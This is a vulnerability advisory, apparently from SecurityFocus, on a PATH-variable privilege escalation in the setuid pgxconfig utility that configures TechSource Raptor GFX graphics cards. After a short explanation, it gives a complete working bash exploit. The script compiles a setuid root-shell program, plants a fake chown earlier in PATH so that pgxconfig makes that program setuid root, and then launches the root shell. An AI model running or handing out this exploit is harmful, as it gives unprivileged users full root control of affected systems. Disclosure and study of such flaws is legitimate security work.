source: http://www.securityfocus.com/bid/1563/info

Raptor GFX cards are designed to handle 24-bit true color applications such as Netscape, seismic, geographical information systems (GIS), satellite imaging, pre-press imaging and general desktop use. They can also be used for high resolution 8-bit applications such as Insignia's SoftWindows, medical imaging and many legacy applications.

Certain versions of the software shipped to configure the Raptor GFX cards are vulnerable to an PATH environment variable attack due to insecure code within pgxconfig the main configuration utility. In particular the pgxconfig uses an insecure system call (system(3s). This function effectively executes binaries resident on the system from within the program. Given that this call must execute binaries on the system at hand it relies on the $PATH variable to tell it where the system binaries reside. This variable is configurable by the user, and therefore a user can provide there own binary to be executed. In this particular case because the program also issues a setuid(0) call (a call which set's the UID of the process in this case, root) the program which the user substitutes is executed as root.


#!/usr/local/bin/bash

        # TechSource Raptor GFX configurator root exploit
        # suid@suid.kg

        # unfortunately a compiler must be installed to use this example
        # exploit. however there's a million ways around this you know
        
        # on my system , gcc isnt in my path
        PATH=$PATH:/usr/local/bin

        # build a little prog nothing new here folks
        echo '#include<stdio.h>' > ./x.c
        echo 'int main(void) { setuid(0); setgid(0); execl
("/bin/sh", "/bin/sh", "-i",0);}' >> ./x.c
        gcc x.c -o foobar
        rm -f ./x.c

        # build a substitute chown command. i much prefer this over
        # regular chown
        echo "#!/bin/sh" > chown
        echo "/usr/bin/chown root ./foobar" >> chown
        echo "/usr/bin/chmod 4755 ./foobar" >> chown
        chmod 0755 chown

        # oooh look its the magical fairy path variable
        export PATH=.:$PATH
        
        # heres one way to skin a cat
        # (theres more, some need valid devices. excercise for the readers)
        /usr/sbin/pgxconfig -i
        rm -f chown

        ./foobar